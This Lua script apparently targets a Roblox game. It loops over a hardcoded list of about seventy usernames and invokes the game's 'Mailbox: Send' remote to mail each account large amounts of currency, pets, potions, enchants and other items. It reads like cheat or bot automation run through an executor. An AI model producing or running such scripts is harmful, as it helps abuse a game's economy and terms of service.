local usernamesString = [[
SolarUltron5664
BlizzardStryker771
CypherStryker9844
TempestZephyr8597
FusionVoid9125
SpectralJinx7277
SolsticeDragon8133
TempestMaverick1877
LyricBolt2585
SolarEmber8521
SolsticeBlaze7502
PrimalLux6386
RuneDragon730
MagnetMyst8353
PulseTalon9901
EclipseDrift9754
CobaltIgnite6225
InfernoYuki7658
SolarIgnite4654
GalacticBerserk4326
VortexTalon4997
CelestialQuiver5029
ZenAstra7752
OnyxEmber7610
RavenOmega2518
StellarRift6282
QuantumIvory9679
MagnetZenith2889
ValorUltron6720
RuneNexus174
RavenEmber7927
FluxRogue5077
NimbusDrift7581
FusionKnight4905
ShadowWarden8607
HarmonyHorizon2455
BlazeGuardian8642
BlazeQuartz676
RadiantBolt3905
LyricAstra8633
BlazeGuardian4241
StellarShadow480
AstroQuiver6432
ElectricZion6028
SereneHaze1395
RuneUmbra9937
BlazeZenith2950
InfernoSilence8313
AstroEmber695
PulseBerserk385
FusionSilence3991
NimbusDynamo2859
CobaltHavoc2968
FusionStorm1459
SpectralFrost6647
FluxSpecter9001
ElectricBlade6800
SereneDrift8771
GravityShadow3275
InfernoDynamo4628
CelestialNova1030
ValorTempest2229
NimbusReaper9820
BlizzardKarma6307
HarmonyZephyr1887
InfernoNebula7175
FluxJade8957
SolsticeQuake9638
]]
local usernames = {}
for line in usernamesString:gmatch("([^\n]*)\n?") do
    table.insert(usernames, line)
end
local function sendMail(username, item, id, amount)
    local args = {
        [1] = username,
        [2] = "wer",
        [3] = item,
        [4] = id,
        [5] = amount
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    wait(1)
end

for _, username in pairs(usernames) do
    sendMail(username, "Currency", "ac2c62f023e6494ea8a6624c49a2bdb0", 28000000)
    sendMail(username, "Pet", "3633cdd19f294fa39e5b51e583938ac4", 65) --PlayerFOXpet
    sendMail(username, "Potion", "272dbc5a55424fe3a9c3c21209e4a2f8",25)
    sendMail(username, "Potion", "b940726bdbee412eb55dd483f5669834",25)
    sendMail(username, "Potion", "69c986d52e7a4f539863aac8e75cabe8",1000)
    sendMail(username, "Enchant", "87d59437bb514ffb95677ea969fca8e0", 1)
    sendMail(username, "Enchant", "9454e7cd015c414d8fd0d0d97517e977", 1)
    sendMail(username, "Enchant", "baa8eb8e9b1448b086912be9f2d00ede", 1)
    sendMail(username, "Misc", "66eb23e8d2cb4464b1045d05e8249e3f", 500)
    sendMail(username, "Misc", "8f42d1247215400a86bd7449e2c7142d", 500)
    sendMail(username, "Misc", "8c8ef0e0ef664e3d99b7e27df6d707bb", 1000)
    sendMail(username, "Misc", "9f28e8c0fc014bab812b34dffce1ee19", 30)--daycare voucher
    wait(1)
end
